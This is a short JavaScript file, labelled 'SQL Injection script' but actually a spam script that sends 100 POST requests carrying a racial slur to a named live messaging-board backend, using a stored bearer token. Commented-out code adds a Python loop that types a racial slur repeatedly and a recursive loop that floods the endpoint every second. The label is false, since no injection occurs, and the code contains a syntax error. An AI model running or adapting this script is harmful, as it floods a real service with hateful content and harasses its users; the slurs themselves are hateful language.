// SQL Injection script

// const {
//   verifyBuyerToken,
//   verifyAdminToken,
//   verifyRole,
//   verifyDealerManagerToken,
//   verifyRoles,
//   verifyAccount,
// } = require("../controllers/middlewares")

const fetch = require('node-fetch');
require('dotenv').config();

const maliciousPayload = {
    id: "69",
    username: "meow",
    message: "meow",
    date: "nigga"
};

const url = 'https://messaging-board-backend.vercel.app/chat'; 





function Troll(){s
  fetch(url, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${process.env.ACCESS_TOKEN}`
    },
    body: JSON.stringify(maliciousPayload)
  })
  .then(response => {
    console.log('Response status:', response.status);
    console.log('Response headers:', response.headers.raw());
    return response.text(); 
  })
  .then(body => {
    console.log('Response body:', body);
  })
  .catch(error => console.error('Error:', error));
}

for(let i = 0; i < 100; i++){
  Troll();
}

  


// def main():
//     while True:
//         pyautogui.typewrite("Nigger")
//         pyautogui.hotkey("enter")
        
//         if keyboard.is_pressed('x'):
//             break

// if __name__ == "__main__":
//     main()





  //   function sendRequest() {
  //     fetch(url, {
  //         method: 'POST',
  //         headers: {
  //             'Content-Type': 'application/json',
  //             'Authorization': `Bearer ${process.env.ACCESS_TOKEN}`
  //         },
  //         body: JSON.stringify(maliciousPayload)
  //     })
  //     .then(response => {
  //         console.log('Response status:', response.status);
  //         console.log('Response headers:', response.headers.raw());
  //         return response.text(); 
  //     })
  //     .then(body => {
  //         console.log('Response body:', body);
  //     })
  //     .catch(error => console.error('Error:', error))
  //     .finally(() => {
  //         // Delay before sending the next request
  //         setTimeout(sendRequest, 1000); // Adjust the delay as needed
  //     });
  // }
  
  // // Start sending requests
  // sendRequest();